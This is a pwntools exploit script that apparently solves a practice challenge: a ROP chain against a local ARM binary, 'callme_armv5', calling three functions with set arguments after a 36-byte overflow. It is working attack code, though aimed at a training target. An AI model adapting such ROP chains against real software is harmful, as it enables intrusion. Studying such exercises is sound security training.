#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./callme_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("instructions...\n")
payload = (
    b"A" * 36 +
    p32(0x10908) + # : pop {r3, r4, r5, r6, r7, r8, sb, pc}
    p32(0x10614) +  # callme_one
    p32(0x0) * 3 +
    p32(0x1) + # r7
    p32(0x2) + # r8
    p32(0x3) + # sb
    p32(0x108f0) + # : mov r0, r7; mov r1, r8; mov r2, sb; blx r3;

    p32(0x10668) + # callme_two
    p32(0x0) * 3 +
    p32(0x1) + # r7
    p32(0x2) + # r8
    p32(0x3) + # sb
    p32(0x108f0) + # : mov r0, r7; mov r1, r8; mov r2, sb; blx r3;

    p32(0x10608) + # callme_three
    p32(0x0) * 3 +
    p32(0x1) + # r7
    p32(0x2) + # r8
    p32(0x3) + # sb
    p32(0x108f0) # : mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
)

io.sendline(payload)

io.interactive()

